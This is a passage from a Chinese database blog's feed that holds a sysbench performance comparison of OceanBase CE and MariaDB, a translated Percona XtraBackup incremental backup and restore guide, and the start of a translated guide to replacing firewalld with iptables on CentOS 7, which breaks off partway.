<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># [配置名, 新值, 旧值, 替换条件: lambda n, o: n != o, 是否是租户级]</span></span><br><span class="line">[<span class="string">&#x27;enable_auto_leader_switch&#x27;</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;enable_one_phase_commit&#x27;</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;weak_read_version_refresh_interval&#x27;</span>, <span class="string">&#x27;5s&#x27;</span>, <span class="string">&#x27;5s&#x27;</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;syslog_level&#x27;</span>, <span class="string">&#x27;PERF&#x27;</span>, <span class="string">&#x27;PERF&#x27;</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;max_syslog_file_count&#x27;</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;enable_syslog_recycle&#x27;</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;trace_log_slow_query_watermark&#x27;</span>, <span class="string">&#x27;10s&#x27;</span>, <span class="string">&#x27;10s&#x27;</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;large_query_threshold&#x27;</span>, <span class="string">&#x27;1s&#x27;</span>, <span class="string">&#x27;1s&#x27;</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;clog_sync_time_warn_threshold&#x27;</span>, <span class="string">&#x27;200ms&#x27;</span>, <span class="string">&#x27;200ms&#x27;</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;syslog_io_bandwidth_limit&#x27;</span>, <span class="string">&#x27;10M&#x27;</span>, <span class="string">&#x27;10M&#x27;</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;enable_sql_audit&#x27;</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;sleep&#x27;</span>, <span class="number">1</span>],</span><br><span class="line">[<span class="string">&#x27;enable_perf_event&#x27;</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;clog_max_unconfirmed_log_count&#x27;</span>, <span class="number">5000</span>, <span class="number">5000</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;autoinc_cache_refresh_interval&#x27;</span>, <span class="string">&#x27;86400s&#x27;</span>, <span class="string">&#x27;86400s&#x27;</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;enable_early_lock_release&#x27;</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">True</span>],</span><br><span class="line">[<span class="string">&#x27;default_compress_func&#x27;</span>, <span class="string">&#x27;lz4_1.0&#x27;</span>, <span class="string">&#x27;lz4_1.0&#x27;</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;_clog_aggregation_buffer_amount&#x27;</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br><span class="line">[<span class="string">&#x27;_flush_clog_aggregation_buffer_timeout&#x27;</span>, <span class="string">&#x27;1ms&#x27;</span>, <span class="string">&#x27;1ms&#x27;</span>, <span class="keyword">lambda</span> n, o: n != o, <span class="literal">False</span>],</span><br></pre></td></tr></table></figure></div>
<p>同时，obd提供了<code>-v, --verbose</code>选项，可以将详细执行过程输出到控制台，便于测试时查看obd修改了什么参数。<br>
比如，我在实际测试时截取了部分日志片段。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">-- execute sql: show parameters like &quot;enable_auto_leader_switch&quot;</span><br><span class="line">-- execute sql: alter system set enable_auto_leader_switch=False</span><br><span class="line">-- execute sql: show parameters like &quot;enable_one_phase_commit&quot;</span><br><span class="line">-- execute sql: alter system set enable_one_phase_commit=False</span><br><span class="line">-- execute sql: show parameters like &quot;weak_read_version_refresh_interval&quot;</span><br><span class="line">-- execute sql: alter system set weak_read_version_refresh_interval=5s</span><br><span class="line">-- execute sql: show parameters like &quot;syslog_level&quot;</span><br><span class="line">-- execute sql: alter system set syslog_level=PERF</span><br><span class="line">-- execute sql: show parameters like &quot;max_syslog_file_count&quot;</span><br><span class="line">-- execute sql: alter system set max_syslog_file_count=100</span><br><span class="line">-- execute sql: show parameters like &quot;enable_syslog_recycle&quot;</span><br><span class="line">-- execute sql: alter system set enable_syslog_recycle=True</span><br><span class="line">-- execute sql: show parameters like &quot;trace_log_slow_query_watermark&quot;</span><br><span class="line">-- execute sql: alter system set trace_log_slow_query_watermark=10s</span><br><span class="line">-- execute sql: show parameters like &quot;large_query_threshold&quot;</span><br><span class="line">-- execute sql: alter system set large_query_threshold=1s</span><br><span class="line">-- execute sql: show parameters like &quot;clog_sync_time_warn_threshold&quot;</span><br><span class="line">-- execute sql: alter system set clog_sync_time_warn_threshold=200ms</span><br><span class="line">-- execute sql: show parameters like &quot;syslog_io_bandwidth_limit&quot;</span><br><span class="line">-- execute sql: alter system set syslog_io_bandwidth_limit=10M</span><br><span class="line">-- execute sql: show parameters like &quot;enable_sql_audit&quot;</span><br><span class="line">-- execute sql: alter system set enable_sql_audit=False</span><br><span class="line">-- execute sql: show parameters like &quot;enable_perf_event&quot;</span><br><span class="line">-- execute sql: alter system set enable_perf_event=False</span><br><span class="line">-- execute sql: show parameters like &quot;clog_max_unconfirmed_log_count&quot;</span><br><span class="line">-- execute sql: alter system set clog_max_unconfirmed_log_count=5000</span><br><span class="line">-- execute sql: show parameters like &quot;autoinc_cache_refresh_interval&quot;</span><br><span class="line">-- execute sql: alter system set autoinc_cache_refresh_interval=86400s</span><br><span class="line">-- execute sql: show parameters like &quot;enable_early_lock_release&quot; tenant=&quot;tpcc&quot;</span><br><span class="line">-- execute sql: alter system set enable_early_lock_release=False tenant=&quot;tpcc&quot;</span><br><span class="line">-- execute sql: show parameters like &quot;default_compress_func&quot;</span><br><span class="line">-- execute sql: alter system set default_compress_func=lz4_1.0</span><br></pre></td></tr></table></figure></div>
<p>在开始测试前，OBD还修改了其他几项租户级系统变量，主要有如下几个，</p>
<table>
<thead>
<tr>
<th>系统变量</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>ob_query_timeout</td>
<td>用于设置查询超时时间，单位是微秒。</td>
</tr>
<tr>
<td>ob_trx_timeout</td>
<td>用于设置事务超时时间，单位为微秒。</td>
</tr>
<tr>
<td>max_allowed_packet</td>
<td>用于设置最大网络包大小，单位是 Byte。</td>
</tr>
<tr>
<td>ob_sql_work_area_percentage</td>
<td>用于 SQL 执行的租户内存百分比限制。</td>
</tr>
<tr>
<td>parallel_max_servers</td>
<td>用于设置每个 Server 上并行执行（Parallel eXecution，PX）线程池的大小。</td>
</tr>
<tr>
<td>parallel_servers_target</td>
<td>用于设置每个 Server 上的大查询排队条件。当并行执行（Parallel eXecution，PX）线程池中有指定的空闲线程数时才调度新查询。</td>
</tr>
</tbody>
</table>
<p>回归正题，在我的测试环境中，使用了如下命令进行测试。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">obd test sysbench obce -v \</span><br><span class="line">--component=&#x27;oceanbase-ce&#x27; \</span><br><span class="line">--user=tpcc --password=tpcc --tenant=tpcc --database=tpcc \</span><br><span class="line">--sysbench-bin=/opt/sysbench/bin/sysbench \</span><br><span class="line">--sysbench-script-dir=/opt/sysbench/share/sysbench \</span><br><span class="line">--script-name=oltp_read_only.lua \</span><br><span class="line">--tables=10 \</span><br><span class="line">--table-size=1000000 \</span><br><span class="line">--threads=1 \</span><br><span class="line">--time=300</span><br></pre></td></tr></table></figure></div>
<p>进行了三轮测试，输出结果如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ 10s ] thds: 1 tps: 17.99 qps: 288.81 (r/w/o: 252.73/0.00/36.08) lat (ms,95%): 81.48 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 20s ] thds: 1 tps: 23.20 qps: 371.55 (r/w/o: 325.15/0.00/46.41) lat (ms,95%): 51.02 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 30s ] thds: 1 tps: 24.10 qps: 385.51 (r/w/o: 337.31/0.00/48.20) lat (ms,95%): 51.02 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">...</span><br><span class="line">[ 10s ] thds: 2 tps: 55.46 qps: 889.94 (r/w/o: 778.81/0.00/111.13) lat (ms,95%): 57.87 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 20s ] thds: 2 tps: 59.61 qps: 952.28 (r/w/o: 833.07/0.00/119.21) lat (ms,95%): 47.47 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 30s ] thds: 2 tps: 63.51 qps: 1016.33 (r/w/o: 889.30/0.00/127.03) lat (ms,95%): 45.79 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">...</span><br><span class="line">[ 10s ] thds: 4 tps: 57.46 qps: 921.63 (r/w/o: 806.30/0.00/115.33) lat (ms,95%): 97.55 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 20s ] thds: 4 tps: 77.31 qps: 1239.30 (r/w/o: 1084.69/0.00/154.61) lat (ms,95%): 78.60 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 30s ] thds: 4 tps: 88.50 qps: 1414.35 (r/w/o: 1237.34/0.00/177.01) lat (ms,95%): 64.47 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h2 id="使用-Sysbench-对-MariaDB-进行测试">使用 Sysbench 对 MariaDB 进行测试</h2>
<ul>
<li>Step 1：创建tpcc用户和tpcc库</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>uroot</span><br><span class="line"><span class="keyword">create</span> schema tpcc;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> tpcc identified <span class="keyword">by</span> <span class="string">&#x27;tpcc&#x27;</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> tpcc.<span class="operator">*</span> <span class="keyword">to</span> tpcc;</span><br><span class="line"><span class="keyword">grant</span> file <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> tpcc;</span><br><span class="line">mysql <span class="operator">-</span>utpcc <span class="operator">-</span>ptpcc tpcc</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Step 2: 使用Sysbench进行测试</li>
</ul>
<p>Sysbench的输入参数与OB测试保持一致，</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sysbench /opt/sysbench/share/sysbench/oltp_read_only.lua \</span><br><span class="line">--mysql-host=10.10.10.101 \</span><br><span class="line">--mysql-user=tpcc --mysql-password=tpcc --mysql-db=tpcc \</span><br><span class="line">--tables=10 --table_size=1000000 \</span><br><span class="line">--threads=1 --events=100000 --report-interval=10 \</span><br><span class="line">--time=300 \</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
<p>测试结果集截取如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ 10s ] thds: 1 tps: 80.96 qps: 1295.84 (r/w/o: 1133.83/0.00/162.02) lat (ms,95%): 29.19 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 20s ] thds: 1 tps: 80.80 qps: 1293.85 (r/w/o: 1132.25/0.00/161.61) lat (ms,95%): 29.72 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 30s ] thds: 1 tps: 84.40 qps: 1350.17 (r/w/o: 1181.37/0.00/168.80) lat (ms,95%): 27.66 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">...</span><br><span class="line">[ 10s ] thds: 2 tps: 200.80 qps: 3212.89 (r/w/o: 2811.19/0.00/401.70) lat (ms,95%): 15.83 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 20s ] thds: 2 tps: 195.10 qps: 3123.93 (r/w/o: 2733.63/0.00/390.30) lat (ms,95%): 23.10 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 30s ] thds: 2 tps: 202.30 qps: 3235.93 (r/w/o: 2831.33/0.00/404.60) lat (ms,95%): 20.37 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">...</span><br><span class="line">[ 10s ] thds: 2 tps: 200.80 qps: 3212.89 (r/w/o: 2811.19/0.00/401.70) lat (ms,95%): 15.83 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 20s ] thds: 2 tps: 195.10 qps: 3123.93 (r/w/o: 2733.63/0.00/390.30) lat (ms,95%): 23.10 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">[ 30s ] thds: 2 tps: 202.30 qps: 3235.93 (r/w/o: 2831.33/0.00/404.60) lat (ms,95%): 20.37 err/s: 0.00 reconn/s: 0.00</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h2 id="测试结果">测试结果</h2>
<p>测试结果记录需要经过分析才能得到有意义的数据。</p>
<p>对OB和MariaDB的测试结果数据进行分析比对，并绘制成图，<br>
我们可以看到，在这次测试中，OB单体的QPS表现是略低于MariaDB的。</p>
<p>图中分为三段，分别对应不同线程值。红线表示OB的测试结果，绿线代表MariaDB的测试结果。</p>
<img  alt="oltp.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220420-69cab339-dce4-4750-98bb-a2e11db7c509.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="总结">总结</h2>
<p>到此，本文的核心内容就已表述完毕，总结如下。<br>
由于虚拟机的性能有限，本次测试只代表趋势，并不能作为DB选型的性能指标数据。</p>
<p>相同受限条件下的测试，当前版本的OB性能略弱与MariaDB，同时，OB资源的消耗大于MariaDB。</p>
<p>Observer的资源分配决定的，由于observer会预分配资源给服务本身和系统租户，所以用户租户被分配的资源一定会小于系统资源，意味着也小于MariaDB所能使用的资源。</p>
<img  alt="ob-memory.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220420-8328960c-64ec-4d0b-8247-5ed76b26844a.png"
                      referrerpolicy="no-referrer"
                >
<p>希望在OB 4.x里可以看到更轻量级的OB，可以达到平替MySQL的性能水平。</p>
<h2 id="相关链接">相关链接</h2>
<ul>
<li><a class="link"   href="https://open.oceanbase.com/docs" >OceanBase 社区版 文档中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/doc/58980" >【最全】OceanBase 社区版入门到实战教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/397122" >https://www.modb.pro/db/397122 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>OceanBase</category>
        <category>OB v3</category>
      </categories>
      <tags>
        <tag>oceanbase</tag>
        <tag>observer</tag>
        <tag>mariadb</tag>
        <tag>sysbench</tag>
        <tag>oceanbase 社区版</tag>
        <tag>ob v3</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] Percona XtraBackup 示例</title>
    <url>/2022/mysql/fanyi-percona-xtrabackup-example/</url>
    <content><![CDATA[<blockquote>
<p>原文链接：<a class="link"   href="https://www.virtual-dba.com/blog/percona-xtrabackup-example/" >https://www.virtual-dba.com/blog/percona-xtrabackup-example/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Steve Champion</p>
</blockquote>
<img  alt="1.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-478f570c-b29e-4271-aaee-732e7a9c007a.jpg"
                      referrerpolicy="no-referrer"
                >
<p>在这个示例中，将使用如下软件版本：</p>
<ol>
<li>Ubuntu v20.04.3</li>
<li>MySQL server v5.7.35</li>
<li>Percona XtraBackup v2.4.24</li>
</ol>
<p>需要重点注意的是 Percona XtraBackup 8.0 的引入是为了在 MySQL 8.0 版本上使用，与 MySQL 5.7 版本不兼容。在写本文时，不存在与 MySQL 的最新版本(8.0.28)兼容的 Percona XtraBackup 版本。详情请参阅 <a class="link"   href="https://www.percona.com/doc/percona-xtrabackup/8.0/index.html" >https://www.percona.com/doc/percona-xtrabackup/8.0/index.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文将逐步展示在 MySQL 5.7 上使用 Percona XtraBackup 建立和恢复增量备份。</p>
<p>本文将使用“$”表示操作系统终端中的命令，并使用“&gt;”表示MySQL客户端命令行中的任何命令。</p>
<h2 id="权限">权限</h2>
<p>执行 Percona XtraBackup 所需的权限可以很容易地在 <a class="link"   href="https://www.percona.com/doc/percona-xtrabackup/2.1/innobackupex/privileges.html" >Percona网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 上找到，如下所示(在这个例子中，所有的操作系统权限都使用了root权限):</p>
<table>
<thead>
<tr>
<th>#</th>
<th>权限列表</th>
<th>示例</th>
<th>权限使用示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>MySQL数据文件夹的文件系统级权限：READ, WRITE, EXECUTE</td>
<td>$sudo xtrabackup</td>
<td>$sudo -i</td>
</tr>
<tr>
<td>MySQL</td>
<td>RELOAD, LOCK TABLES, REPLICATION CLIENT, CREATE TABLESPACE, PROCESS, SUPER</td>
<td>&gt;GRANT RELOAD, LOCK TABLES, REPLICATION CLIENT ON <em>.</em> TO ‘user’@’localhost’;</td>
<td>&gt;GRANT ALL ON <em>.</em> TO ‘user’@’localhost’;(root user)</td>
</tr>
</tbody>
</table>
<p>表1: Percona XtraBackup 所需的最小权限。注意:<code>$</code>用于表示操作系统命令行，而<code>&gt;</code>用于表示MySQL客户端命令行。</p>
<h2 id="备份">备份</h2>
<p><strong>全量备份：</strong></p>
<p>增量备份必须先从一个全量备份开始。命令如此：<code>$xtrabackup --backup --user=bkupusr --password --target-dir=/home/user/fullBackupDestination</code>，这里<code>target-dir</code>是全备的目标文件夹，在这个示例中，目标文件夹是<code>/home/bkupusr/xtra/full</code>。如果目标文件夹不存在，将会被创建。（如图2和图3）</p>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-e4fcfb68-953b-43ce-bb86-45cedf592406.png"
                      referrerpolicy="no-referrer"
                >
<p>图1: 使用 Percona XtraBackup 完成全备。注意，这个例子没有使用<code>--user</code>或<code>--password</code>选项，因为已经使用mysql_config_editor程序设置了<code>login-path</code>。</p>
<p>图1显示了正在进行的全备，但是没有<code>--user</code>或<code>--password</code>选项，因为登录凭证是使用<code>$mysql_config_editor</code>设置的。关于这个主题的教程可以在这里找到: <a class="link"   href="https://www.virtual-dba.com/blog/how-to-use-mysql-config-editor/" >https://www.virtual-dba.com/blog/how-to-use-mysql-config-editor/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-658c6621-9ca8-4a1c-945a-354ce3241cf1.png"
                      referrerpolicy="no-referrer"
                >
<p>图2：当目标文件夹不存在时进行备份</p>
<img  alt="4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-d46b9e09-358b-481c-9059-cb66d7d58589.png"
                      referrerpolicy="no-referrer"
                >
<p>图3：指定的目标文件夹被新建</p>
<p><strong>增量备份：</strong></p>
<p>在建立了初始的全备之后，接下来是增备。增备的命令与全备的命令非常相似，但是需要一个额外的目录。现在，<code>target-dir</code>将是新的增量文件存放的地方，选项<code>--incremental-basedir</code>是最近进行备份(在本例中是全备份)的位置; 图4展示了一个全备后的第一次增备。</p>
<img  alt="5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-da8be021-86c7-45c9-912e-77c64334497f.png"
                      referrerpolicy="no-referrer"
                >
图4: 第一个增量备份。使用incremental-basedir作为全备，并将target-dir选为新的目标来存储增备。
<p>对于下一个增量备份，命令是相同的，但是现在target-dir将指定为下一个增备的位置，而incremental-basedir将指向最近的增备，如图5所示。</p>
<img  alt="6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-03cbe15e-0e64-41c5-ab08-229ee6a121e8.png"
                      referrerpolicy="no-referrer"
                >
图5: 第二次增备，使用第一次增备作为incremental-basedir。
<p>现在，存在三个备份（图6-8）：一个全备和两个增备。</p>
<img  alt="7.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-5fe38148-7351-43d1-aa5a-59cc6cd5cede.png"
                      referrerpolicy="no-referrer"
                >
<p>图6：包含全量备份的目录</p>
<img  alt="8.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-52949f20-4933-40bc-bd41-435168a62fdb.png"
                      referrerpolicy="no-referrer"
                >
<p>图7：包含第一次增备的目录</p>
<img  alt="9.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-bbc37389-ff8d-4ec0-9b30-93df19d64096.png"
                      referrerpolicy="no-referrer"
                >
<p>图8：包含第二次增备的目录</p>
<p>对于额外的增备，继续以这种方式，将之前的<code>target-dir</code>移动到当前的<code>incremental-basedir</code>。</p>
<h2 id="恢复">恢复</h2>
<p>最后一步是还原备份。在实际执行恢复之前有一些设置:</p>
<ol>
<li>MySQL 服务必须停止。</li>
<li>MySQL 数据目录必须为空。</li>
</ol>
<img  alt="10.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-235acf8d-03b1-43d7-934a-c4e08100d519.png"
                      referrerpolicy="no-referrer"
                >
<p>图9：恢复准备步骤1 – 停止mysql服务</p>
<img  alt="11.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-3e72532e-138b-48b8-98f9-bee24db1cf4a.png"
                      referrerpolicy="no-referrer"
                >
<p>图10：恢复准备步骤2 – 清空MySQL数据目录</p>
<ol>
<li>
<p>首先准备备份：</p>
<ul>
<li><code>$xtrabackup --prepare --target-dir=/home/usr/full_bkup_directory</code>
<ul>
<li>注意<code>--prepare</code>选项</li>
</ul>
</li>
</ul>
</li>
<li>
<p>全量备份恢复到空数据路径：</p>
<ul>
<li><code>$xtrabackup --copy-back --target-dir=/home/usr/full_bkup_directory</code>
<ul>
<li><code>--copy-back</code>是恢复的命令</li>
</ul>
</li>
</ul>
</li>
<li>
<p>必须检查或设定新的恢复备份集的权限：</p>
<ul>
<li><code>$chown mysql:mysql mysql</code>
<ul>
<li>这将递归应用到数据目录的所有文件</li>
</ul>
</li>
</ul>
</li>
<li>
<p>恢复MySQL服务：</p>
<ul>
<li><code>$service mysql start</code></li>
</ul>
</li>
</ol>
<img  alt="12.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-bdf11e6d-6cbf-4067-a91a-158bf6bc5655.png"
                      referrerpolicy="no-referrer"
                >
图11： 准备恢复全量备份
<img  alt="13.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-7d2e9d23-dcc4-417b-b444-e1e2534857fe.png"
                      referrerpolicy="no-referrer"
                >
图12： 实际恢复完全备份
<img  alt="14.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-047efa8d-90e1-4290-96b4-f344656fb334.png"
                      referrerpolicy="no-referrer"
                >
图13：恢复后变更权限
<img  alt="15.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-eab08265-68a9-435b-bd86-528efcbe7c64.png"
                      referrerpolicy="no-referrer"
                >
图14：恢复MySQL服务
<p>对于增备设定和copy-back的步骤是一样的，但是准备步骤不同；出最后一个增备外，需要在语句中增加参数<code>–-apply-log-only</code>和<code>--prepare</code>。</p>
<p>增备的准备步骤如下：</p>
<ol>
<li>
<p>准备全备：<br>
<code>$xtrabackup --prepare --apply-log-only --target-dir=/data/backups/full</code></p>
</li>
<li>
<p>向全备应用第一个增备：<br>
<code>$xtrabackup --prepare --apply-log-only --target-dir=/data/backups/full --incremental-dir=/data/backups/inc1</code></p>
</li>
<li>
<p>向全备应用第二个增备：<br>
<code>$xtrabackup --prepare --apply-log-only --target-dir=/data/backups/full --incremental-dir=/data/backups/inc2</code></p>
</li>
</ol>
<img  alt="16.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-4478de7b-d66c-4b8b-9b9b-68a6b8801109.png"
                      referrerpolicy="no-referrer"
                >
图15：为恢复增备准备全备
<img  alt="17.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-3328a942-3e7c-44d2-835a-fbf201c7569c.png"
                      referrerpolicy="no-referrer"
                >
图16：为恢复准备第一个增备
<img  alt="18.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220407-72b7d873-acd8-499b-adb9-19dc025dce7f.png"
                      referrerpolicy="no-referrer"
                >
图17：为恢复准备第二个增备
<p>同样的，复制回步骤将与全量备份一样，使用唯一的准备好的全备。在复制回步骤完成后，恢复完成。</p>
<hr>
<blockquote>
<p>译者注<br>
考虑到兼容性问题，在使用 PXB 时需要注意 MySQL 的版本，如果使用的是 MariaDB，则建议使用 mariabackup。</p>
</blockquote>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>percona</tag>
        <tag>译文</tag>
        <tag>xtrabackup</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 如何在 CentOS 7上安装 Iptables</title>
    <url>/2022/modb/fanyi-centos-7-install-iptables/</url>
    <content><![CDATA[<blockquote>
<p>原文链接：<a class="link"   href="https://linuxize.com/post/how-to-install-iptables-on-centos-7/" >https://linuxize.com/post/how-to-install-iptables-on-centos-7/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Linuxize</p>
</blockquote>
<p>从 CentOS 7 开始，firewalld 取代了 iptables 作为默认的防火墙管理工具。</p>
<p><a class="link"   href="https://linuxize.com/post/how-to-setup-a-firewall-with-firewalld-on-centos-7/" >FirewallD <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是一个完整的防火墙解决方案，可以通过一个名为firewall-cmd的命令行工具来控制。如果您更熟悉Iptables命令行语法，那么您可以禁用FirewallD并退回到经典的iptables设定。</p>
<p>本教程将向您展示如何禁用FirewallD服务并安装iptables。</p>
<img  alt="1.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220330-ee301efa-6b84-43c2-b615-c0f98172982a.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="先决条件">先决条件</h2>
<p>在开始本教程之前，您需要确保已登录带有 <a class="link"   href="https://linuxize.com/post/create-a-sudo-user-on-centos/" >sudo 权限的用户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="禁用FirewallD">禁用FirewallD</h2>
<p>在CentOS 7系统上禁用FirewallD，需要以下几步：</p>
<ol>
<li>输入下面的命令，停止FirewallD服务：</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl stop firewalld</span></span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>禁用FirewallD服务，以免开机自动启动：</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="built_in">disable</span> firewalld</span></span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>屏蔽FirewallD服务，防止它被其他服务启动:</li>
</ol>
